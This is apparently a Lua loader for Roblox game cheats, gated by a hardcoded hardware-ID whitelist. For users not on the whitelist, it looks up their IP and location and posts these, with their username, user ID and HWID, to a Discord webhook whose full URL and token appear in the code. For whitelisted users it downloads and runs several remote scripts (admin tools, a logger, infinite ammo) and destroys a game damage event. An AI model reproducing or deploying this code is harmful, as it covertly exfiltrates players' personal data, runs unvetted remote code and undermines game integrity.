-- main loader — единственная точка проверки вайтлиста

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local whitelist = {
    "C017884D-908B-4482-ACDB-2E4A3C1476CF",
    "415F92CD-908A-464C-9123-9CFD3ECE330E",
    "ADC447EF-9C8A-4A4E-966C-220FE03C8F4F",
    "5D2C1A34-B6E1-4A29-A731-1295328B6A22"
}

local valid = false
for _, allowed_hwid in ipairs(whitelist) do
    if allowed_hwid == hwid then
        valid = true
        break
    end
end

if not valid then
    -- логгируем невалидного перед киком
    pcall(function()
        local req = syn and syn.request or http_request or request
        if not req then return end
        
        local HttpService = game:GetService("HttpService")
        local lp = game.Players.LocalPlayer
        
        local ip_info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A"}
        local ok, resp = pcall(req, {Url = "http://ip-api.com/json", Method = "GET"})
        if ok and resp and resp.Success then
            local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok2 then ip_info = d end
        end
        
        local place_name = "Unknown"
        pcall(function() place_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
        
        req({
            Url = "https://discord.com/api/webhooks/1471569290183442523/engyxPsJOc6mQpCcrpYKM5oYV7PS0J15aQEsaCuL96__qJqhbYaFGbkCRiVJqMFCksFD",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({["embeds"] = {{
                ["title"] = "⛔ Unauthorized Attempt",
                ["color"] = 0xFF0000,
                ["fields"] = {
                    {["name"] = "Name",    ["value"] = lp.Name,             ["inline"] = true},
                    {["name"] = "User ID", ["value"] = tostring(lp.UserId), ["inline"] = true},
                    {["name"] = "HWID",    ["value"] = "```"..hwid.."```",  ["inline"] = false},
                    {["name"] = "Game",    ["value"] = place_name,          ["inline"] = false},
                    {["name"] = "IP",      ["value"] = "||"..(ip_info.query or "N/A").."||", ["inline"] = false},
                    {["name"] = "Country", ["value"] = (ip_info.country or "N/A").." / "..(ip_info.city or "N/A"), ["inline"] = true},
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}})
        })
    end)
    
    game.Players.LocalPlayer:Kick("Not whitelisted")
    return
end

-- ========== WHITELISTED — LOAD EVERYTHING ==========

print("[System] Whitelisted — loading...")

-- Логгер
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/wartycoon/main/logger.lua", true))()
end)

-- Основные скрипты
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpgAircraft/main/easy.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))()
end)

pcall(function()
    game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy()
end)
